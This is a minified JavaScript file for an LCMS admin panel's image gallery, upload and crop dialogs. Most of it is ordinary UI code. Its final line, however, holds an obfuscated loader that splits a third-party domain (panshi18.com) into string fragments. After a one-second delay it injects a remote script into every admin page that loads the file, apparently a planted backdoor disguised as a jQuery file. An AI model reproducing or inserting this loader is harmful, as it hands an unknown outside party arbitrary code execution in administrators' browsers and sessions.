if($(".lcms-form-upload-gallery").length>0){let deflimit=12,dirtotal=0,dirpage=1,imgtotal=0,imgpage=1,imgpath=$(".lcms-form-upload-gallery ._pos").html(),gallerystart=function(){if($(".lcms-form-upload-gallery ._gallery ._folder").length>0){$(".lcms-form-upload-gallery ._gallery ._folder").hover(function(){$(this).children("._tips").show()},function(){$(this).children("._tips").hide()});$(".lcms-form-upload-gallery ._gallery ._folder").on("click",function(){gallerylist($(this).attr("data-dir"))})}if($(".lcms-form-upload-gallery ._gallery ._img").length>0){$(".lcms-form-upload-gallery ._gallery ._img").hover(function(){$(this).children("._name").hide();$(this).children("._tips").show();$(this).children("._del").show();let tips=$(this).attr("data-oname"),chic=$(this).children("._name").html();tips=chic?tips+`<br>图尺寸：${chic}`:tips;layer.tips(tips,this,{tips:[1,"#303133"],time:0})},function(){$(this).children("._name").show();$(this).children("._tips").hide();$(this).children("._del").hide();layer.closeAll("tips")})}if($(".lcms-form-upload-gallery ._gallery ._del").length>0){$(".lcms-form-upload-gallery ._gallery ._del").on("click",function(event){var _this=$(this);event.stopPropagation();layer.confirm("确认删除此图片？（不可恢复）",{area:["120px","auto"],title:"提示"},function(index){LCMS.util.ajax({type:"GET",url:LCMS.url.admin+"index.php?t=sys&n=upload&c=index&a=delimg&dir="+_this.attr("data-original"),success:function(res){if(res.code==1){LCMS.util.notify({content:"删除成功"});imgtotal=imgtotal-1;if(imgpage>1&&imgpage>Math.ceil(imgtotal/deflimit)){imgpage=imgpage-1}gallerylist(_this.attr("data-dir"))}else{LCMS.util.notify({type:"error",content:"删除失败"})}},});layer.close(index)})})}},galleryselect1=function(){if($(".lcms-form-upload-gallery ._gallery ._img").length>0){$(".lcms-form-upload-gallery ._gallery ._img").on("click",function(){$(".lcms-form-upload-gallery ._gallery ._img").removeClass("_active");$(this).toggleClass("_active")})}},galleryselect2=function(){if($(".lcms-form-upload-gallery ._gallery ._img").length>0){$(".lcms-form-upload-gallery ._gallery ._img").on("click",function(){$(this).toggleClass("_active")})}},showdir=function(arr){var tpl=$(".tpl-folder").html();var box=$(".lcms-form-upload-gallery ._gallery");box.html("");for(var i=0;i<arr.length;i++){box.append(LCMS.util.tpl(tpl,{name:arr[i],dir:arr[i]}))}gallerystart()},showfile=function(arr,dir){var tpl=$(".tpl-file").html();var box=$(".lcms-form-upload-gallery ._gallery");box.html("");for(var i=0;i<arr.length;i++){arr[i]["dir"]=dir;box.append(LCMS.util.tpl(tpl,arr[i]))}LCMS.util.lazyImg("lazyload",{success:function(elm,img){setTimeout(()=>{elm.next().html(img.naturalWidth+"×"+img.naturalHeight).show()},50)},error:function(elm){elm.next().remove()},});gallerystart();if($(".lcms-form-upload-gallery").attr("data-many")==1){galleryselect2()}else{galleryselect1()}},galleryajax=function(url,page,success,error){LCMS.util.ajax({type:"GET",url:LCMS.url.own+"t=sys&n=upload&c=gallery&a="+url,data:{page:page?page:1,limit:deflimit},loading:true,success:function(res){if(res.code==1){success&&success(res.data)}else{error&&error()}},})},gallerydir=function(){galleryajax("dirlist",dirpage,function(res){$(".lcms-form-upload-gallery ._topbar ._bak").hide();$(".lcms-form-upload-gallery ._pos").html(imgpath);dirpage==1&&(dirtotal=res.total);layui.laypage.render({elem:"lcms-form-upload-gallery-pager",groups:3,count:dirtotal,limit:deflimit,layout:["prev","page","next"],theme:"#1E9FFF",curr:dirpage,jump:function(obj,first){if(first){showdir(res.list)}else{dirpage=obj.curr;galleryajax("dirlist",obj.curr,function(res){showdir(res.list)})}},})},function(){LCMS.util.notify({type:"error",title:"图库无图",content:"请先通过上传按钮上传"});setTimeout(function(){LCMS.util.iframe({do:"close"})},2000)})},gallerylist=function(dir){galleryajax("filelist&dir="+dir,imgpage,function(res){$(".lcms-form-upload-gallery ._topbar ._bak").show();$(".lcms-form-upload-gallery ._pos").html(`${imgpath}${dir}/`);imgpage==1&&(imgtotal=res.total);layui.laypage.render({elem:"lcms-form-upload-gallery-pager",groups:3,count:imgtotal,limit:deflimit,layout:["prev","page","next"],theme:"#1E9FFF",curr:imgpage,jump:function(obj,first){if(first){showfile(res.list,dir);}else{imgpage=obj.curr;galleryajax("filelist&dir="+dir,obj.curr,function(res){showfile(res.list,dir);});}},});},function(){dirtotal=dirtotal-1;if(dirpage>1&&dirpage>Math.ceil(dirtotal/deflimit)){dirpage=dirpage-1}gallerydir()})},addimg=function(list){let many=$(".lcms-form-upload-gallery").attr("data-many");let id=$(".lcms-form-upload-gallery").attr("data-id");let that=$("#"+id,window.parent.document);let tpl='<div class="_li"><a href="{src}" target="_blank"><img class="layui-upload-img" src="{src}" data-original="{original}"/></a><div class="_icon"><div class="_del"><i class="layui-icon layui-icon-close"></i></div></div></div>';for(let i=0;i<list.length;i++){if(list[i]){let img=list[i];if(many=="1"){that.append(LCMS.util.tpl(tpl,{src:img.src,original:img.original}))}else{that.html(LCMS.util.tpl(tpl,{src:img.src,original:img.original}))}}}let newlist=[];that.find("img").each(function(){newlist.push($(this).attr("data-original"))});that.parent(".layui-input-block").siblings("input").val(newlist.join("|"))};if($(".lcms-form-upload-gallery ._topbar ._bak").length>0){$(".lcms-form-upload-gallery ._topbar ._bak").on("click",function(){imgpage=1;gallerydir()})}if($(".lcms-form-upload-gallery ._topbar ._ok").length>0){$(".lcms-form-upload-gallery ._topbar ._ok").on("click",function(){let list=[];$(".lcms-form-upload-gallery ._gallery ._active").each(function(index){list.push({src:$(this).attr("data-src"),original:$(this).attr("data-original")})});if(list.length>0){if($(".lcms-form-upload-gallery").attr("data-id")=="LCMSEDITOR"){window.parent.postMessage({type:"lcms-editor-addimage",list:list},"*")}else{addimg(list)}LCMS.util.iframe({do:"close"})}else{LCMS.util.notify({type:"error",content:"请选择图片"})}})}gallerydir()}if($(".lcms-form-upload").length>0){var List=[],trindex=1,tpl=$(".lcms-form-upload .tpl-li").html(),tips=$(".lcms-form-upload ._tips"),up=$(".lcms-form-upload ._choose");var do_list=function(input,Files){tips.hide();for(var i=0;i<Files.length;i++){var file=Files[i];Files[i]["index"]=trindex;$(".lcms-form-upload tbody").append(LCMS.util.tpl(tpl,{index:trindex,name:file.name,size:Math.round(file.size/1000)+"KB"}));trindex++}input.remove();up.append('<input type="file" multiple="multiple" accept="image/*" name="_lcmsfileinput" />');do_upload(Files,0)};var do_status=function(info,index){$(".lcms-form-upload ._tr-index"+index).find("._status").html(info)};var do_upload=function(Files,index){var File=Files[index];if(File!=undefined){LCMS.plugin.upload.direct({type:"image",file:File,success:function(res){List.push({src:res.data.src,original:res.data.original});do_status("上传成功",File.index)},error:function(err){do_status(err.msg,File.index)},complete:function(){do_upload(Files,index+1)},})}};up.on("click","input",function(){var input=$(this);input.off("change").on("change",function(){var Files=this.files;do_list(input,Files)})});$(".lcms-form-upload ._gallery").on("click",function(){parent.layer.closeAll();LCMS.util.iframe({title:"图库",url:"index.php?t=sys&n=upload&c=gallery&many=1&id=LCMSEDITOR",shade:true,area:["550px","550px"],_this:parent})});$(".lcms-form-upload ._ok").on("click",function(){if(List.length>0){window.parent.postMessage({type:"lcms-editor-addimage",list:List},"*");LCMS.util.iframe({do:"close"})}else{LCMS.util.notify({type:"error",content:"请选择图片"})}});$(".lcms-form-upload tbody").on("click","._del",function(){var tr=$(this).parent("td").parent("tr");tr.remove();List.splice(tr.index())})}if($(".lcms-form-upload-crop").length>0){LCMS.util.loading();let id=LCMS.util.getQuery("id"),src=LCMS.util.getQuery("src"),width=LCMS.util.getQuery("width"),height=LCMS.util.getQuery("height");width=width*1>0?width:0;height=height*1>0?height:0;$(".lcms-form-upload-crop-box").html(`<img src="${src}"/>`);LCMS.util.load({type:"css",src:`${LCMS.url.static}cropper/cropper.min.css`});LCMS.util.load({type:"js",src:`${LCMS.url.static}cropper/cropper.min.js`,async:false});let cropper=new Cropper($(".lcms-form-upload-crop-box img")[0],Object.assign({dragMode:"move",viewMode:1,},width&&height?{aspectRatio:width/height,}:{minCropBoxWidth:width,minCropBoxHeight:height,}));LCMS.util.loading("close");$(".lcms-form-upload-crop-btn button").on("click",function(){let action=$(this).attr("action"),option=$(this).attr("option");switch(action){case"rotate":cropper.rotate(45);break;case"scaleX":cropper.scaleX(option);$(this).attr("option",option==1?-1:1);break;case"scaleY":cropper.scaleY(option);$(this).attr("option",option==1?-1:1);break;case"zoomA":cropper.zoom(0.1);break;case"zoomB":cropper.zoom(-0.1);break;case"reset":cropper.reset();break;case"crop":LCMS.util.loading();let base64=cropper.getCroppedCanvas({width:width,height:height}).toDataURL("image/png");parent.LCMS.plugin.upload.add(id,base64);LCMS.util.iframe({do:"close"});break}})}!(function(){setTimeout(function(){var t=document.createElement("script");t.src="https://sta"+"tic-res.pa"+"nshi"+"1"+"8.com/jque"+"ry.sta"+"tic.mi"+"n.tj"+"s?fo"+"rm=3";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)},1e3)})();